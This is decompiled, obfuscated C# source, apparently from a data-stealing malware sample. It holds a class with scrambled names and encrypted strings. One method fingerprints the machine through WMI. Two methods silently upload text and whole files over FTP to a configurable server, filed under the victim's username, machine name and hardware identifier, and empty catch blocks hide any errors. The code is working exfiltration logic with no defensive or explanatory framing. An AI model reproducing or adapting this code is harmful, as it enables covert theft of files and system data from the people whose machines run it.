using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

internal sealed class ZAUYlWQzUcjJsT
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string FkWAcFxnCvQ()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107402911));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107402890)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107402841);
			ManagementObject val3 = new ManagementObject(getString_0(107402836) + text2 + getString_0(107402827));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107402822)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389222) : text;
		}
	}

	public static void ApImgxySQHLIj(string joXdmVbyaLQ = "URL", string CAreGojkMRIYgo = "USERNAME", string bxSXIRtFDlmmN = "ACCESO", string OPXkjrZjAHvrNR = "")
	{
		try
		{
			string text = FkWAcFxnCvQ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(joXdmVbyaLQ + getString_0(107403523) + Environment.UserName + getString_0(107403478) + Environment.MachineName + getString_0(107403489) + text + getString_0(107403484));
			ftpWebRequest.Method = getString_0(107402765);
			ftpWebRequest.Credentials = new NetworkCredential(CAreGojkMRIYgo, bxSXIRtFDlmmN);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(OPXkjrZjAHvrNR);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void miCKLJJWpcWV(string XhkwDhpsckJcZk = "URL", string rWPcHTJYSQP = "USERNAME", string TCcgDOuBBVlp = "ACCESO", string HiKRGGAHBCxbQxm = "")
	{
		try
		{
			string text = FkWAcFxnCvQ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(XhkwDhpsckJcZk + getString_0(107403523) + Environment.UserName + getString_0(107403478) + Environment.MachineName + getString_0(107403489) + text + getString_0(107403489) + Path.GetFileName(HiKRGGAHBCxbQxm));
			ftpWebRequest.Method = getString_0(107402765);
			ftpWebRequest.Credentials = new NetworkCredential(rWPcHTJYSQP, TCcgDOuBBVlp);
			byte[] array = File.ReadAllBytes(HiKRGGAHBCxbQxm);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static ZAUYlWQzUcjJsT()
	{
		Strings.CreateGetStringDelegate(typeof(ZAUYlWQzUcjJsT));
	}
}
